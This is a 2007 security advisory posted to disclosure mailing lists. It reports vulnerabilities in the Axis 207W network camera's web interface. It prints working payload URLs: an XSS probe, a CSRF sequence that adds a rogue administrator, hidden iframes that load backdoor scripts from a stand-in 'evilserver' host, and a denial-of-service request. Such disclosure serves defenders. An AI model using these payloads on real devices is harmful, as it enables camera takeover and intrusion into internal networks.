
Date: Sat, 15 Sep 2007 10:13:14 -0400
From: Seth Fogie <seth@...scanner.com>
To: bugtraq@...urityfocus.com, full-disclosure@...ts.grok.org.uk
Subject: Axis 207W Wireless Camera Web Interface - Multiple Vulnerabilities

http://airscanner.com/security/07080701_axis.htm

*Airscanner Mobile Security Advisory #07080101: Axis 207W Multiple 
Vulnerabilities*

*Product:*
AXIS 207W

*Platform:*
NA

*Requirements:*
AXIS 207W Camera on WLAN/LAN

* Credits:*
Seth Fogie
Airscanner Mobile Security
http://www.airscanner.com
May 30, 2007

* Risk Level:*
High - Camera compromise leading to network compromise

*Program Summary:
*From the site: http://www.axis.com/products/cam_207/index.htm
The AXIS 207 offers the best image quality in its class, providing 
excellent image quality also in low lighting conditions.

# Superior image quality with progressive scan
# 30 frames per second in VGA resolution (640x480 pixels)
# Network security using multiple user access levels with password 
protection

*Details:*
Details are presented at http://www.informit.com/ 
<http://www.informit.com/articles/article.aspx?p=1016102>

In summary, the AXIS 207W is vulnerable to numerous attacks. Some of 
these are related to wireless protocol vulnerabilities, but the majority 
are exploitable via the web application interface included with the 
camera. The most significant issue is that a CSRF attack against a user 
logged in as an administrator can lead to root access of the Linux based 
operating system on the camera. As a result, the camera can be turned 
into an internal resource for any malicous hacker, through which custom 
scripts can be launched. This can include port scans, banner grabbing, 
buffer overflow exploits, application attacks, and more. Note that this 
attack vector will bypass most firewalls.

Web Application:
# Base64 'encrypted' user/pass sent as plaintext from client to user.

# Global Cross-site scripting vulnerability:
http://<IP>/incl/image_incl.shtml?camNo=</script><script>alert(String.fromCharCode(88,83,83))</script>

# Cross-site Request Forgery attack leads to root access on camera 
through which custom scripts can be executed:
1. Reboot the camera - http://1<IP>/axis-cgi/admin/restart.cgi
2. Add a new administrator - 
http://<IP>/axis-cgi/admin/pwdgrp.cgi?action=add&user=owner1&grp=axuser&sgrp=axview:axoper:axadmin&pwd=owner1&comment=WebUser&return_page=/admin/users_set.shtml%3Fpageclose%3D1
3. Root the camera/add a backdoor - 
http://<IP>/admin/restartMessage.shtml?server=<iframe%20style=visibility:hidden%20src=http://www.evilserver.com/wifi/axisbd.php><iframe 
src=http://www.evilserver.com/wifi/axisrb.htm><!â€”

# Denial of Service attack via restricted user account:
http://<IP>/axis-cgi/buffer/command.cgi?do=start&buffername=<unique 
buffer name>

* Workaround:*
None.

*Vendor Response:*
Vendor notified

Copyright (c) 2007 Airscanner Corp.

Permission is granted for the redistribution of this alert 
electronically. It may not be edited in any way without the express 
written consent of Airscanner Corp. If you wish to reprint the whole or 
any part of this alert in any other medium other than electronically, 
please contact Airscanner Corp. for permission.

Disclaimer: The information in the advisory is believed to be accurate 
at the time of publishing based on currently available information. Use 
of the information constitutes acceptance for use on an AS IS condition. 
There are no warranties with regard to this information. Neither the 
author nor the publisher accepts any liability for any direct, indirect, 
or consequential loss or damage arising from use of, or reliance on, 
this information.


